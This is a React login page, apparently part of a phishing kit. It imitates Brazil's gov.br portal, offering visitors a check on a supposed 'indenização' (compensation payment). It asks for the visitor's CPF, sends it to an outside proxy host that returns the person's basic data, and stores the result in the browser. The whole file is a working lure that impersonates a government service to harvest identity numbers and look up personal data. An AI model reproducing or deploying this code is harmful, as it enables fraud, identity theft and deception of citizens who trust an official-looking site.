import React, { useEffect, useRef, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import IMask from 'imask';
import styles from './Login.module.scss';

const Login = () => {
  const cpfRef = useRef(null);
  const navigate = useNavigate();
  const [errorMessage, setErrorMessage] = useState('');

  useEffect(() => {
    if (cpfRef.current) {
      IMask(cpfRef.current, {
        mask: '000.000.000-00',
      });
    }
  }, []);

  const handleConsulta = async () => {
    setErrorMessage(''); // Limpa a mensagem ao tentar consultar

    const cpfMascarado = cpfRef.current?.value?.trim();
    if (!cpfMascarado) {
      setErrorMessage('Por favor, digite um CPF válido.');
      return;
    }

    const cpfLimpo = cpfMascarado.replace(/\D/g, '');

    try {
      const response = await fetch(`https://proxy-a.vercel.app/api/proxy?cpf=${cpfLimpo}`);
      const data = await response.json();

      if (data?.dadosBasicos) {
        localStorage.setItem('usercpf', cpfLimpo);
        localStorage.setItem('dadosUsuario', JSON.stringify(data.dadosBasicos));
        navigate('/consulta');
      } else {
        setErrorMessage('CPF não encontrado.');
      }
    } catch (error) {
      console.error('Erro na requisição:', error);
      setErrorMessage('CPF INVÁLIDO, DIGITE NOVAMENTE');
    }
  };

  return (
    <div className={styles.gov}>
      {/* Navbar */}
      <div className={styles.navbar}>
        <div>
          <img src="/govbr.png" alt="Logo GovBR" />
        </div>
        <div>
          <i className="bi bi-three-dots-vertical"></i>
          <i className="bi bi-circle-half"></i>
          <i className="bi bi-grid-3x3-gap-fill"></i>
          <span className={styles.entrarBtn}>Entrar</span>
        </div>
      </div>

      {/* Caminho */}
      <div className={styles.path}>
        <i className="bi bi-list"></i>
        <span>Benefício &gt; Indenização &gt; <b>Acessar</b></span>
      </div>

      {/* Slider */}
      <div className={styles.slider}>
        <img src="/slide.png" alt="Slide" />
      </div>

      {/* Formulário */}
      <div className={styles.form}>
        <span className={styles.titleForm}>Verifique sua indenização:</span>

        <div className={styles.f1}>
          <img src="/id.png" alt="Ícone identificação" />
          <span>Identificação</span>
        </div>

        <div className={styles.f2}>
          <span>CPF</span>
          <input
            type="text"
            placeholder="Digite seu CPF"
            ref={cpfRef}
            onChange={() => setErrorMessage('')} // Limpa erro ao digitar
          />
          {/* Mensagem de erro */}
          {errorMessage && (
            <div style={{ color: 'red', fontSize: '12px', marginTop: '5px', marginBottom: '8px', fontWeight: 'bold' }}>
              {errorMessage}
            </div>
          )}
          <span onClick={handleConsulta}>Consultar Indenização</span>
        </div>
      </div>

      {/* Rodapé */}
      <div className={styles.footer}>
        <img src="/govwhite.png" alt="Logo Branco" />
        <span>Todo o conteúdo deste site está publicado sob a licença</span>
        <span>Creative Commons Atribuição - Sem Derivações 3.0 Não Adaptada</span>
      </div>
    </div>
  );
};

export default Login;
